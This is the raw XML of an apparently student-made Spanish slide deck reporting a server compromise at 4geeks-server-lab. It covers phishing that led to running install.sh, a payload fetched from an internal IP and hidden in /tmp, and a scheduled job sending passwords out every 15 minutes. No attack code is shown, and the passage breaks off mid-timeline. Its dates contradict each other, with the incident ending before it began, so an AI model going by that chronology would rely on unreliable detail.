          <text:p text:style-name="a122" text:class-names="" text:cond-style-name=""><text:span text:style-name="a120" text:class-names="">18 Jun 2025</text:span><text:span text:style-name="a121" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id24" draw:style-name="a124" draw:name="Picture 19" svg:x="7.37792in" svg:y="0.45719in" svg:width="1.9591in" svg:height="1.96672in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image2.jpeg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>4Geeks Academy - Techstars Startup Week Caracas</svg:desc>
        </draw:frame>
        <draw:frame draw:id="id25" draw:style-name="a132" draw:name="TextBox 21" svg:x="1.97409in" svg:y="3.67378in" svg:width="6.37957in" svg:height="0.99294in">
          <draw:text-box>
            <text:p text:style-name="a128" text:class-names="" text:cond-style-name=""><text:span text:style-name="a125" text:class-names=""><text:line-break/></text:span><text:span text:style-name="a126" text:class-names="">Socrates David Rodriguez Vazquez – Diego Dario Silva Amorin</text:span><text:span text:style-name="a127" text:class-names=""/></text:p>
            <text:p text:style-name="a131" text:class-names="" text:cond-style-name=""><text:span text:style-name="a129" text:class-names="">-</text:span><text:span text:style-name="a130" text:class-names=""/></text:p>
          </draw:text-box>
          <svg:title/>
          <svg:desc/>
        </draw:frame>
        <presentation:notes draw:style-name="a138">
          <draw:page-thumbnail draw:page-number="1" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id26" presentation:style-name="a133" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id27" presentation:style-name="a134" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id28" presentation:style-name="a137" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a136" text:class-names="" text:cond-style-name=""><text:span text:style-name="a135" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">1</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 2" draw:style-name="a139" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-257">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id29" draw:style-name="a140" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id30" draw:style-name="a141" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id31" draw:style-name="a145" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a144" text:class-names="" text:cond-style-name=""><text:span text:style-name="a142" text:class-names="">¿Qué pasó? — Resumen Ejecutivo</text:span><text:span text:style-name="a143"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32" draw:style-name="a149" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a148" text:class-names="" text:cond-style-name=""><text:span text:style-name="a146" text:class-names="">El servidor 4geeks-server-lab estuvo comprometido durante casi un año sin ser detectado</text:span><text:span text:style-name="a147" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="2.22in" svg:height="3.3in" draw:id="id33" draw:style-name="a150" draw:name="Shape 3">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="1.28in" svg:width="2.22in" svg:height="0.45in" draw:id="id34" draw:style-name="a151" draw:name="Shape 4">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id35" draw:style-name="a152" draw:name="Image 1" svg:x="1.14in" svg:y="1.33in" svg:width="0.55in" svg:height="0.38in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image4.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="0.42in" svg:y="1.82in" svg:width="2.02in" svg:height="0.45in" draw:id="id36" draw:style-name="a156" draw:name="Text 5">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a155" text:class-names="" text:cond-style-name=""><text:span text:style-name="a153" text:class-names="">Engaño al empleado</text:span><text:span text:style-name="a154" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.42in" svg:y="2.3in" svg:width="2.02in" svg:height="2.2in" draw:id="id37" draw:style-name="a160" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a159" text:class-names="" text:cond-style-name=""><text:span text:style-name="a157" text:class-names="">Un correo externo convenció al usuario 'reports' de ejecutar un script malicioso creyendo que era legítimo.</text:span><text:span text:style-name="a158" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.7in" svg:y="1.28in" svg:width="2.22in" svg:height="3.3in" draw:id="id38" draw:style-name="a161" draw:name="Shape 7">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.7in" svg:y="1.28in" svg:width="2.22in" svg:height="0.45in" draw:id="id39" draw:style-name="a162" draw:name="Shape 8">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id40" draw:style-name="a163" draw:name="Image 2" svg:x="3.52in" svg:y="1.33in" svg:width="0.55in" svg:height="0.38in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image5.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="2.8in" svg:y="1.82in" svg:width="2.02in" svg:height="0.45in" draw:id="id41" draw:style-name="a167" draw:name="Text 9">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a166" text:class-names="" text:cond-style-name=""><text:span text:style-name="a164" text:class-names="">Instalación de malware</text:span><text:span text:style-name="a165" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="2.8in" svg:y="2.3in" svg:width="2.02in" svg:height="2.2in" draw:id="id42" draw:style-name="a171" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a170" text:class-names="" text:cond-style-name=""><text:span text:style-name="a168" text:class-names="">El script descargó un programa del servidor del atacante y lo instaló oculto en el sistema sin ser detectado.</text:span><text:span text:style-name="a169" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.08in" svg:y="1.28in" svg:width="2.22in" svg:height="3.3in" draw:id="id43" draw:style-name="a172" draw:name="Shape 11">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.08in" svg:y="1.28in" svg:width="2.22in" svg:height="0.45in" draw:id="id44" draw:style-name="a173" draw:name="Shape 12">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id45" draw:style-name="a174" draw:name="Image 3" svg:x="5.9in" svg:y="1.33in" svg:width="0.55in" svg:height="0.38in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="5.18in" svg:y="1.82in" svg:width="2.02in" svg:height="0.45in" draw:id="id46" draw:style-name="a178" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a177" text:class-names="" text:cond-style-name=""><text:span text:style-name="a175" text:class-names="">Puerta trasera permanente</text:span><text:span text:style-name="a176" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="5.18in" svg:y="2.3in" svg:width="2.02in" svg:height="2.2in" draw:id="id47" draw:style-name="a182" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a181" text:class-names="" text:cond-style-name=""><text:span text:style-name="a179" text:class-names="">Se creó una tarea que ejecutaba automáticamente el robo de datos cada 15 minutos, incluso tras reinicios.</text:span><text:span text:style-name="a180" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.46in" svg:y="1.28in" svg:width="2.22in" svg:height="3.3in" draw:id="id48" draw:style-name="a183" draw:name="Shape 15">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.46in" svg:y="1.28in" svg:width="2.22in" svg:height="0.45in" draw:id="id49" draw:style-name="a184" draw:name="Shape 16">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id50" draw:style-name="a185" draw:name="Image 4" svg:x="8.28in" svg:y="1.33in" svg:width="0.55in" svg:height="0.38in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image7.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="7.56in" svg:y="1.82in" svg:width="2.02in" svg:height="0.45in" draw:id="id51" draw:style-name="a189" draw:name="Text 17">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a188" text:class-names="" text:cond-style-name=""><text:span text:style-name="a186" text:class-names="">Robo de contraseñas</text:span><text:span text:style-name="a187" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="7.56in" svg:y="2.3in" svg:width="2.02in" svg:height="2.2in" draw:id="id52" draw:style-name="a193" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a192" text:class-names="" text:cond-style-name=""><text:span text:style-name="a190" text:class-names="">Las contraseñas de todos los usuarios del servidor fueron enviadas automáticamente al atacante cada 15 minutos.</text:span><text:span text:style-name="a191" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.32in" svg:y="4.72in" svg:width="9.36in" svg:height="0.58in" draw:id="id53" draw:style-name="a194" draw:name="Shape 19">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.5in" svg:y="4.79in" svg:width="9in" svg:height="0.42in" draw:id="id54" draw:style-name="a198" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a197" text:class-names="" text:cond-style-name=""><text:span text:style-name="a195" text:class-names="">El incidente ocurrió entre el 21 de junio de 2025 y el 18 de junio de 2025 <text:s text:c="1"/>| <text:s text:c="1"/>Detectado y resuelto el 18 de junio de 2025 <text:s text:c="1"/>| <text:s text:c="1"/>Sin interrupción del servicio durante la remediación</text:span><text:span text:style-name="a196" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <presentation:notes draw:style-name="a204">
          <draw:page-thumbnail draw:page-number="2" svg:x="-0.1875in" svg:y="1.25in" svg:width="6in" svg:height="3.375in" presentation:class="page" draw:id="id55" presentation:style-name="a199" draw:name="Slide Image Placeholder 1">
            <svg:title/>
            <svg:desc/>
          </draw:page-thumbnail>
          <draw:frame draw:id="id56" presentation:style-name="a200" draw:name="Notes Placeholder 2" svg:x="0.5625in" svg:y="4.8125in" svg:width="4.5in" svg:height="3.9375in" presentation:class="notes" presentation:placeholder="true">
            <draw:text-box/>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
          <draw:frame draw:id="id57" presentation:style-name="a203" draw:name="Slide Number Placeholder 3" svg:x="3.18576in" svg:y="9.49826in" svg:width="2.4375in" svg:height="0.50174in" presentation:class="page-number" presentation:placeholder="false">
            <draw:text-box>
              <text:p text:style-name="a202" text:class-names="" text:cond-style-name=""><text:span text:style-name="a201" text:class-names=""><text:page-number style:num-format="1" text:fixed="false">2</text:page-number></text:span></text:p>
            </draw:text-box>
            <svg:title/>
            <svg:desc/>
          </draw:frame>
        </presentation:notes>
      </draw:page>
      <draw:page draw:name="Slide 3" draw:style-name="a205" draw:master-page-name="Master1-Layout1-cust-DEFAULT" presentation:presentation-page-layout-name="Master1-PPL1" draw:id="Slide-258">
        <draw:custom-shape svg:x="0in" svg:y="0in" svg:width="10in" svg:height="1.2in" draw:id="id58" draw:style-name="a206" draw:name="Shape 0">
          <svg:title/>
          <svg:desc/>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:frame draw:id="id59" draw:style-name="a207" draw:name="Image 0" svg:x="0.32in" svg:y="0.28in" svg:width="0.58in" svg:height="0.58in" style:rel-width="scale" style:rel-height="scale">
          <draw:image xlink:href="media/image8.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
          <svg:title/>
          <svg:desc>preencoded.png</svg:desc>
        </draw:frame>
        <draw:custom-shape svg:x="1.05in" svg:y="0.1in" svg:width="9.2in" svg:height="0.55in" draw:id="id60" draw:style-name="a211" draw:name="Text 1">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a210" text:class-names="" text:cond-style-name=""><text:span text:style-name="a208" text:class-names="">¿Cómo sucedió? — Cronología del Incidente</text:span><text:span text:style-name="a209"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61" draw:style-name="a215" draw:name="Text 2">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a214" text:class-names="" text:cond-style-name=""><text:span text:style-name="a212" text:class-names="">Reconstrucción completa de la cadena de ataque desde el primer acceso hasta la remediación</text:span><text:span text:style-name="a213" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.37in" svg:y="1.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id62" draw:style-name="a216" draw:name="Shape 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7in" svg:y="1.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id63" draw:style-name="a220" draw:name="Text 4">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a219" text:class-names="" text:cond-style-name=""><text:span text:style-name="a217" text:class-names="">1</text:span><text:span text:style-name="a218" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.53in" svg:y="1.68in" svg:width="0in" svg:height="0.55in" draw:id="id64" draw:style-name="a222" draw:name="Shape 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8in" svg:y="1.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id65" draw:style-name="a226" draw:name="Text 6">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a225" text:class-names="" text:cond-style-name=""><text:span text:style-name="a223" text:class-names="">21 Jun 2025</text:span><text:span text:style-name="a224" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="1.54in" svg:width="4in" svg:height="0.22in" draw:id="id66" draw:style-name="a230" draw:name="Text 7">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a229" text:class-names="" text:cond-style-name=""><text:span text:style-name="a227" text:class-names="">Acceso SSH inicial comprometido</text:span><text:span text:style-name="a228" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="1.75in" svg:width="4in" svg:height="0.22in" draw:id="id67" draw:style-name="a234" draw:name="Text 8">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a233" text:class-names="" text:cond-style-name=""><text:span text:style-name="a231" text:class-names="">El atacante accedió con credenciales robadas desde 192.168.1.50</text:span><text:span text:style-name="a232" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.37in" svg:y="2.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id68" draw:style-name="a235" draw:name="Shape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7in" svg:y="2.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id69" draw:style-name="a239" draw:name="Text 10">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a238" text:class-names="" text:cond-style-name=""><text:span text:style-name="a236" text:class-names="">2</text:span><text:span text:style-name="a237" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.53in" svg:y="2.68in" svg:width="0in" svg:height="0.55in" draw:id="id70" draw:style-name="a241" draw:name="Shape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8in" svg:y="2.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id71" draw:style-name="a245" draw:name="Text 12">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a244" text:class-names="" text:cond-style-name=""><text:span text:style-name="a242" text:class-names="">23 Jun 2025</text:span><text:span text:style-name="a243" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="2.54in" svg:width="4in" svg:height="0.22in" draw:id="id72" draw:style-name="a249" draw:name="Text 13">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a248" text:class-names="" text:cond-style-name=""><text:span text:style-name="a246" text:class-names="">Ingeniería social → install.sh</text:span><text:span text:style-name="a247" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="2.75in" svg:width="4in" svg:height="0.22in" draw:id="id73" draw:style-name="a253" draw:name="Text 14">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a252" text:class-names="" text:cond-style-name=""><text:span text:style-name="a250" text:class-names="">Correo de unknown@externalmail.com convenció a 'reports' de ejecutar el dropper</text:span><text:span text:style-name="a251" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.37in" svg:y="3.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id74" draw:style-name="a254" draw:name="Shape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7in" svg:y="3.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id75" draw:style-name="a258" draw:name="Text 16">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a257" text:class-names="" text:cond-style-name=""><text:span text:style-name="a255" text:class-names="">3</text:span><text:span text:style-name="a256" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.53in" svg:y="3.68in" svg:width="0in" svg:height="0.55in" draw:id="id76" draw:style-name="a260" draw:name="Shape 1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8in" svg:y="3.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id77" draw:style-name="a264" draw:name="Text 18">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a263" text:class-names="" text:cond-style-name=""><text:span text:style-name="a261" text:class-names="">23 Jun 2025</text:span><text:span text:style-name="a262" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="3.54in" svg:width="4in" svg:height="0.22in" draw:id="id78" draw:style-name="a268" draw:name="Text 19">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a267" text:class-names="" text:cond-style-name=""><text:span text:style-name="a265" text:class-names="">Payload descargado y ejecutado</text:span><text:span text:style-name="a266" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.8in" svg:y="3.75in" svg:width="4in" svg:height="0.22in" draw:id="id79" draw:style-name="a272" draw:name="Text 20">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a271" text:class-names="" text:cond-style-name=""><text:span text:style-name="a269" text:class-names="">Script descargó payload.bin desde 192.168.1.100 y lo ejecutó oculto en /tmp/.temp/</text:span><text:span text:style-name="a270" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.37in" svg:y="4.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id80" draw:style-name="a273" draw:name="Shape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7in" svg:y="4.36in" svg:width="0.32in" svg:height="0.32in" draw:id="id81" draw:style-name="a277" draw:name="Text 22">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a276" text:class-names="" text:cond-style-name=""><text:span text:style-name="a274" text:class-names="">4</text:span><text:span text:style-name="a275" text:class-names=""/></text:p>
          <draw:enhanced-geometry xmlns:dr3d="urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0" draw:type="non-primitive" svg:viewBox="0 0 21600 21600" draw:enhanced-path="M 0 0 L 21600 0 21600 21600 0 21600 Z N"/>
        </draw:custom-shape>
        <draw:custom-shape svg:x="0.53in" svg:y="4.68in" svg:width="0in" svg:height="0.55in" draw:id="id82" draw:style-name="a279" draw:name="Shape 2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8in" svg:y="4.35in" svg:width="1.3in" svg:height="0.22in" draw:id="id83" draw:style-name="a283" draw:name="Text 24">
          <svg:title/>
          <svg:desc/>
          <text:p text:style-name="a282" text:class-names="" text:cond-style-name=""><text:span text:style-name="a280" text:class-names="">23 Jun 2025</text:span><text:span text:style-name="a281" text:class-names=""/></text:p>
